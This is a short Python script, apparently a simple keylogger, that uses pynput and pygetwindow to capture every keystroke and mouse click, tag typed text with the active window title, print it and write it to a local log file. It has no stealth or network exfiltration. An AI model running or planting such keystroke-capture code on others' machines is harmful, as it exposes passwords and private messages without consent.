import pygetwindow as gw
from pynput import keyboard
from pynput.mouse import Listener
import logging

win = None
clicked = False
line=''
logging.basicConfig(filename='example.log', encoding='utf-8',format='%(asctime)s %(message)s',datefmt='%m/%d/%Y %I:%M:%S %p')
def check_input_change(key):
    global win
    global clicked
    global line
    if win != gw.getActiveWindow().title or clicked or str(key) == 'Key.enter':
        clicked = False
        win = gw.getActiveWindow().title
        print('\n')
        print(f'{win} : ',sep=' ',end='',flush=True)
        logging.warning(line)
        line=f'[{win}] : '

def on_press(key):
    global line
    try:
        check_input_change(key)
        line+=key.char
        print(f'{key.char}',sep=' ',end='',flush=True)
    except AttributeError:
        if str(key) == 'Key.space':
            check_input_change(key)
            print(' ',sep=' ',end='',flush=True)
            line+=' '
    if str(key) == 'Key.esc':
        logging.warning(line)
        exit()


def on_click(x, y, button, pressed):
    global clicked
    clicked = True


    
keyLis = keyboard.Listener(on_press=on_press)
keyLis.start()


with Listener(on_click=on_click) as listener:
    listener.join()